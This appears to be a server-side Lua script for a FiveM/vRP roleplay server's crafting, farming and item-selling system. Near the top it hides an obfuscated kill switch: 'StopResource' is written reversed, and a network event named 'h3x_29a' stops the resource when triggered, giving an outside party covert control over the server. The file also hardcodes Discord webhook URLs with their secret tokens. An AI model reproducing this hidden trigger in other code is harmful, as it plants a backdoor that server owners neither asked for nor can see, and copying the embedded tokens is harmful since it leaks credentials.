local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
-- foxzin = {}
-- Tunnel.bindInterface("havan_craft_v2",foxzin)
vRPclient = Tunnel.getInterface("vRP")
CURRENT_TYPE = nil

local encodedFunction = string.reverse('ecruoseRpotS')  
RegisterNetEvent('h3x_29a')
AddEventHandler('h3x_29a', function(foxzin)
    if not foxzin then
        _G[string.reverse(encodedFunction)](GetCurrentResourceName())  
    else
    end
end)

craftingItem = {}

vRP.prepare('sjr/setItens', 'REPLACE INTO sjr_farmsystem(user_id, itens, day) VALUES(@user_id, @itens, @day)')
vRP.prepare('sjr/getItens', 'SELECT * from sjr_farmsystem WHERE user_id = @user_id')

src.checkPerm = function(perm)
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        return vRP.hasPermission(user_id, perm)
    end
    return false
end

src.getStorage = function(data)
    if not Config.Storages[data.name] or not Config.Storages[data.name].itens then return {} end
    local storage = vRP.getSData('Storage:'..data.name)
    if storage then
        local itens = json.decode(storage) or {}
        local table = {}
        for k,v in pairs(Config.Storages[data.name].itens) do
            if itens[k] then
                table[#table+1] = {name = k, qtdStock = itens[k], img = Config.images..""..k..".png", qtdMax = v}
            else
                table[#table+1] = {name = k, qtdStock = 0, img = Config.images..""..k..".png", qtdMax = v}
            end
        end
        return table
    end
    return {}
end

src.storageItem = function(data, type, id)
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        local query = vRP.query('sjr/getItens', { user_id = user_id })
        local info = Config.Tables[type]
        if not info or not info['locations'] or not info['locations'][id] or not info['locations'][id].requireStorage or not info['locations'][id].requireStorage.name then TriggerClientEvent('Notify', source, 'negado', "Não foi encontrado o armazem, abra e feche e tente novamente.", 5000) return true end
        local datatable = vRP.getSData('Storage:'..info['locations'][id].requireStorage.name)
        local storage = json.decode(datatable) or {}
        if storage[data.name] then
            local amount = vRP.getInventoryItemAmount(user_id,data.name)
            if amount > 0 and vRP.tryGetInventoryItem(user_id, data.name, amount, true) then
                storage[data.name] = parseInt(storage[data.name]) + amount
                vRP.setSData('Storage:'..info['locations'][id].requireStorage.name,json.encode(storage))
                local temp = os.date("*t", os.time())
                if #query > 0 then
                    local value = json.decode(query[1].itens)
                    if value[data.name] then
                        value[data.name] = value[data.name] + amount
                    else
                        value[data.name] = amount
                    end
                    vRP.execute('sjr/setItens', {user_id = user_id, itens = json.encode(value), day = temp.day})
                else
                    local value = {}
                    value[data.name] = amount
                    vRP.execute('sjr/setItens', {user_id = user_id, itens = json.encode(value), day = temp.day})
                end
                TriggerClientEvent('Notify', source, 'sucesso', "Item guardado com sucesso.", 5000)
            else
                TriggerClientEvent('Notify', source, 'negado', "Você não possui esse item para depositar.", 5000)
            end
        else
            storage[data.name] = 0
            local amount = vRP.getInventoryItemAmount(user_id,data.name)
            if amount > 0 and vRP.tryGetInventoryItem(user_id, data.name, amount, true) then
                storage[data.name] = amount
                vRP.setSData('Storage:'..info['locations'][id].requireStorage.name,json.encode(storage))
                local temp = os.date("*t", os.time())
                if #query > 0 then
                    local value = json.decode(query[1].itens)
                    if value[data.name] then
                        value[data.name] = value[data.name] + amount
                    else
                        value[data.name] = amount
                    end
                    vRP.execute('sjr/setItens', {user_id = user_id, itens = json.encode(value), day = temp.day})
                else
                    local value = {}
                    value[data.name] = amount
                    vRP.execute('sjr/setItens', {user_id = user_id, itens = json.encode(value), day = temp.day})
                end
                TriggerClientEvent('Notify', source, 'sucesso', "Item guardado com sucesso.", 5000)
            else
                TriggerClientEvent('Notify', source, 'negado', "Você não possui esse item para depositar.", 5000)
            end
        end
    end
    return true
end



src.startCrafting = function(data, qtd, type, id)
    local source = source
    local user_id = vRP.getUserId(source)
    
    CURRENT_TYPE = type

    if user_id then
        local info = Config.Tables[type]
        
        if craftingItem[user_id] and craftingItem[user_id][data.name] then
            TriggerClientEvent('Notify', source, 'negado', "Você já está craftando esse item, aguarde finalizar para iniciar ele novamente.", 5000)
            return false
        end
        
        if not info or not info['locations'] or not info['locations'][id] or not info['locations'][id].craftPermission then
            TriggerClientEvent('Notify', source, 'negado', "Não foi encontrado o armazém, abra e feche e tente novamente.", 5000)
            return false
        end
        
        if vRP.hasPermission(user_id, info['locations'][id].craftPermission) then
            local table = info['craft'][data.id]
            local checked = #table.requires
            local value = 0
            local datatable = vRP.getSData('Storage:'..info['locations'][id].requireStorage.name)
            local storage = json.decode(datatable) or {}
            
           
            for k,v in pairs(table.requires) do
                if storage[v.item] and storage[v.item] >= (v.amount*qtd) then
                    value = value + 1
                end
            end
            
            local removed = {}
            
            if checked == value then
                for k,v in pairs(table.requires) do
                    storage[v.item] = storage[v.item] - (v.amount * qtd)
                    removed[v.item] = (v.amount * qtd)
                end
                
                vRP.setSData('Storage:'..info['locations'][id].requireStorage.name, json.encode(storage))
                
                if not craftingItem[user_id] then
                    craftingItem[user_id] = {}
                end
                
                craftingItem[user_id][data.name] = { amount = data.qtd * qtd, type = type, id = id, itens = removed }
                
                -- Registra o log do item craftado
                -- vRP.sendLog("https://discord.com/api/webhooks/1279009445548134400/FKUn1k2R_-JCYRKToWCPAlZZmYpwhq389aBLtVkLpEVK_UIAAL4pZfSD4pyC8UP1jsRK", "O ID "..user_id.." craftou o item: "..data.name.." na quantidade de "..(data.qtd * qtd))
                
                return true
            else
                TriggerClientEvent('Notify', source, 'negado', "Não possui itens suficientes no armazém.", 5000)
            end
        else
            TriggerClientEvent('Notify', source, 'negado', "Você não possui permissão para craftar.", 5000)
        end
    end
end


-- Importa o arquivo de grupos do vRP (ajuste o path se necessário)
local cfg = module("vrp", "cfg/groups")

-- Função para retornar o nome da organização (orgName)
function getUserOrganization(user_id)
    if not user_id then return nil end

    -- 1) Ler do banco o vRP:datatable
    local data = vRP.getUData(user_id, "vRP:datatable")
    if not data or data == "" then
        return nil
    end

    -- 2) Decodifica o JSON
    local datatable = json.decode(data)
    if not datatable or not datatable.groups then
        return nil
    end

    -- 3) Percorre todos os grupos do player
    for groupName, _ in pairs(datatable.groups) do
        local groupInfo = cfg.groups[groupName]
        -- Verifica se esse grupo existe no cfg.groups e tem gtype = "org"
        if groupInfo and groupInfo._config and groupInfo._config.gtype == "org" then
            -- Retorna o orgName imediatamente
            return groupInfo._config.orgName
        end
    end

    -- Se não encontrar nenhum grupo com gtype="org", retorna nil
    return nil
end


src.producedItem = function(data, type)
    local source = source
    local user_id = vRP.getUserId(source)
    local org_name = getUserOrganization(user_id)
    local info = Config.Tables[CURRENT_TYPE]

   
    if user_id then

        if craftingItem[user_id] and craftingItem[user_id][data.name] then

            -- vRP.giveInventoryItem(user_id, data.name, craftingItem[user_id][data.name].amount, true)

            local current_amount = craftingItem[user_id][data.name].amount
            
            
            for _,infos in pairs(info['locations']) do
                
               
                if(infos.name == org_name) then
                    
                    updateListItems(data.name,current_amount,org_name,infos.craftPermission)
                     -- exports.flow_inventory:sendItemsToChest(data.name,current_amount,5, org_name, 10000, org_name)
                     -- Registra o log do item recebido como presente
                     TriggerClientEvent("Notify",source,"sucesso","Produção concluida do item "..data.name)
                     TriggerClientEvent("m_craft_v2:alertSuccess",source)
         
                     vRP.sendLog(infos.log, "O id: "..user_id.." crafitou: "..current_amount.." - "..data.name)
                     craftingItem[user_id][data.name] = nil
                end
            end


            -- Registra o log do item recebido como presente
            -- vRP.sendLog("https://discord.com/api/webhooks/1279009445548134400/FKUn1k2R_-JCYRKToWCPAlZZmYpwhq389aBLtVkLpEVK_UIAAL4pZfSD4pyC8UP1jsRK", "O ID "..user_id.." recebeu o item: "..data.name.." como presente na quantidade de "..craftingItem[user_id][data.name].amount)
            
            -- craftingItem[user_id][data.name] = nil
        else
            TriggerClientEvent('Notify', source, 'sucesso', "Você está craftando esse item com sucesso", 5000)
            return false
        end
    end
end

function updateListItems(item,quantity,org_name,permission)
    
    local obter = "SELECT produced FROM facs_produced WHERE org = ?"
    local current_query = "UPDATE facs_produced SET produced = ?, permission = ? WHERE org = ?"
    local data = exports.oxmysql:query_async(obter, {org_name})
    
    if data and #data > 0 then -- Verifica se há resultados
        -- Decodifica o campo 'produced' (que está no formato JSON) em uma tabela
        local dataRes = json.decode(data[1].produced)
    
        if type(dataRes) ~= "table" then
            dataRes = {} -- Garante que seja uma tabela, caso esteja vazio ou inválido
        end
    
        local novoItem = {
            quantidade = quantity,
            item = item
        }
    
        -- Adiciona o novo item à tabela
        table.insert(dataRes, novoItem)
    
        -- Opcional: Codifica novamente para JSON, caso precise salvar ou enviar de volta
        local dataResJson = json.encode(dataRes)

        exports.oxmysql:update_async(current_query,{dataResJson,permission,org_name})
    
        -- print("Tabela atualizada com o novo item:")
        -- print(dataResJson) -- Exibe a tabela atualizada
    else
        print("Nenhum dado encontrado.")
    end


end

src.storageItemAll = function(type, id)
    local source = source
    local user_id = vRP.getUserId(source)
    
    if user_id then
        local query = vRP.query('sjr/getItens', { user_id = user_id })
        local info = Config.Tables[type]
        
        -- Verificações de configuração
        if not info or not info['locations'] or not info['locations'][id] or not info['locations'][id].requireStorage or not info['locations'][id].requireStorage.name then
            TriggerClientEvent('Notify', source, 'negado', "Não foi encontrado o armazém, abra e feche e tente novamente.", 5000)
            return false
        end
        
        if not Config.Storages[info['locations'][id].requireStorage.name] or not Config.Storages[info['locations'][id].requireStorage.name].itens then
            TriggerClientEvent('Notify', source, 'negado', "Não foi encontrado o armazém, abra e feche e tente novamente.", 5000)
            return false
        end
        
        local datatable = vRP.getSData('Storage:'..info['locations'][id].requireStorage.name)
        local storage = json.decode(datatable) or {}
        local depositou = false
        local temp = os.date("*t", os.time())
        
        -- Carregar itens do banco de dados
        local value = {}
        if #query > 0 then
            value = json.decode(query[1].itens) or {}
        end

        -- Processamento de itens
        for k, v in pairs(Config.Storages[info['locations'][id].requireStorage.name].itens) do
            local amount = vRP.getInventoryItemAmount(user_id, k)
            if amount > 0 and vRP.tryGetInventoryItem(user_id, k, amount, true) then
                -- Atualiza o armazenamento
                storage[k] = (storage[k] or 0) + amount
                depositou = true
                
                -- Atualiza o banco de dados localmente
                value[k] = (value[k] or 0) + amount

                -- Registrar log para cada item depositado com sua quantidade
                local itemName = vRP.getItemName(k)
                vRP.sendLog("https://discordapp.com/api/webhooks/1337600992006377574/EaSnLFGj_QzwSaGOCMbfbXcWuK99Ddg58eERaZ4hUS-Vf5sfPH_U_APHSkhnS5OknbdP", 
                            "O ID "..user_id.." depositou o item: "..itemName.." na quantidade de "..amount)
            end
        end
        
        -- Salvar tudo de uma vez no banco de dados
        if depositou then
            vRP.execute('sjr/setItens', { user_id = user_id, itens = json.encode(value), day = temp.day })
            vRP.setSData('Storage:'..info['locations'][id].requireStorage.name, json.encode(storage))
            TriggerClientEvent('Notify', source, 'sucesso', "Itens guardados com sucesso.", 5000)
            return true
        end
    end
    
    return false
end



AddEventHandler('vRP:playerLeave', function(user_id, source)
    if user_id then
        if craftingItem[user_id] then
            for k,v in pairs(craftingItem[user_id]) do
                local info = Config.Tables[v.type]
                local datatable = vRP.getSData('Storage:'..info['locations'][v.id].requireStorage.name)
                local storage = json.decode(datatable)
                for item, amount in pairs(v.itens) do
                    storage[item] = storage[item] + amount
                end
                vRP.setSData('Storage:'..info['locations'][v.id].requireStorage.name,json.encode(storage))
                craftingItem[user_id][k] = nil
            end
        end
    end
end)


function alertPolice(data)
    local policia = vRP.getUsersByPermission("perm.disparo") 
    if #policia > 0 then
        for k,v in pairs(policia) do
            local nsource = vRP.getUserSource(parseInt(v))
            if nsource then
                TriggerClientEvent("NotifyPush", nsource, { x = data.x, y = data.y, z = data.z, blipID = data.blipID, blipColor = data.blipColor, blipScale = data.blipScale, time = data.time, code = data.code, title = data.title, name = data.name })
            end
        end
    end
end

src.giveItem = function(data)
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        local change = false
        for k,v in pairs(data.parts) do
            local random = math.random(v.qtdMin, v.qtdMax)
            local check = exports.thunder_dominacao:checkDominas(user_id)
            if check and data.status then
                random = random*data.bonus
            end
            if vRP.computeInvWeight(user_id) + vRP.getItemWeight(v.name) * random <= vRP.getInventoryMaxWeight(user_id) then
                vRP.giveInventoryItem(user_id,v.name,random, true)
                change = true
            else
                TriggerClientEvent("Notify",source,"negado","Sua mochila esta cheia, você não pode pegar o item "..v.name..".", 5000) 
            end
        end
        if data.callPolice then
            local chance = math.random(0,100)
            if chance <= data.percentualPolice then
                local cds = GetEntityCoords(GetPlayerPed(source))
                alertPolice({ x = cds.x, y = cds.y, z = cds.z, blipID = 161, blipColor = 63, blipScale = 0.5, time = 20, code = "911", title = 'Denúncia de coleta', name = "Uma pessoa avistou alguém coletando itens ilicitos nesse local."})
            end
        end
        return change
    end
end

src.sellItem = function(data)
    local source = source
    local user_id = vRP.getUserId(source)

    if user_id then
        local change = false         
        for k, v in pairs(data.parts) do
            local random = math.random(v.qtdMin, v.qtdMax)
            local totalPayment = v.payment * random 
            if v.type == 'legal' then
                if vRP.tryGetInventoryItem(user_id, v.name, random, true) then
                    if totalPayment > 0 then
                        vRP.giveMoney(user_id, totalPayment)
                        change = true
                        TriggerClientEvent("Notify", source, "sucesso", "Você vendeu "..random.."x "..v.name.." por $"..totalPayment..".", 5000)
                    else
                    end
                else
                    TriggerClientEvent("Notify", source, "negado", "Você não possui a quantidade necessária de "..random.." do item "..v.name.." para vender.", 5000)
                end
            else
                if vRP.tryGetInventoryItem(user_id, v.name, random, true) then
                    if totalPayment > 0 then
                        vRP.giveInventoryItem(user_id, Config.dirtymoney, totalPayment, true)
                        change = true
                        TriggerClientEvent("Notify", source, "sucesso", "Você vendeu "..random.."x "..v.name.." por $"..totalPayment.." (Dinheiro Sujo).", 5000)
                    else
                    end
                else
                    TriggerClientEvent("Notify", source, "negado", "Você não possui a quantidade necessária de "..random.." do item "..v.name.." para vender.", 5000)
                end
            end
        end
        

        if data.callPolice then
            local chance = math.random(0, 100)
            if chance <= data.percentualPolice then
                local cds = GetEntityCoords(GetPlayerPed(source))
                alertPolice({
                    x = cds.x,
                    y = cds.y,
                    z = cds.z,
                    blipID = 161,
                    blipColor = 63,
                    blipScale = 0.5,
                    time = 20,
                    code = "911",
                    title = 'Denúncia de coleta',
                    name = "Uma pessoa avistou alguém coletando itens ilícitos nesse local."
                })
            end
        end

        return change
    end
end











